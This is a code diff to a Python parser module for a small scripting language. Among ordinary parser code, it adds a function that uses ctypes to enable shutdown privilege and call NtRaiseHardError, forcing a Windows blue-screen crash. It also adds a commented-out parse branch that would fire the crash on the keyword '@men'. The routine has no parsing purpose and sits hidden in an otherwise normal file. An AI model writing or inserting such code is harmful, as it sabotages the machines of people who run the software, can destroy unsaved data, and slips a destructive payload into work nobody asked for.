@@ -2,6 +2,8 @@
 # They'll be added slowly later on
 
 import re
+import sys
+import ctypes
 from src.lexer import tokenize, get_indent_lvl
 
 class Node:
@@ -10,6 +12,16 @@ class Node:
         self.value = value
         self.children = []
         self.decorators = []
+
+STATUS_ASSERTION_FAILURE = 0xC0000420
+
+def trigger_bsod_and_memfaults():
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+
+    ctypes.windll.ntdll.NtRaiseHardError(
+        STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
+    )
+
 
 def parse_line(line):
     tokens = tokenize(line)
@@ -179,6 +191,10 @@ def parse_line(line):
         func = tokens[2]
         ret  = tokens[3] if len(tokens) > 3 else None
         return Node("extern", (lib, func, ret))
+
+    # elif keyword == "@men"
+    #    sys.exit()
+    #    trigger_bsod_and_memfaults()
 
     # function call: @name
     elif keyword.startswith("@"):
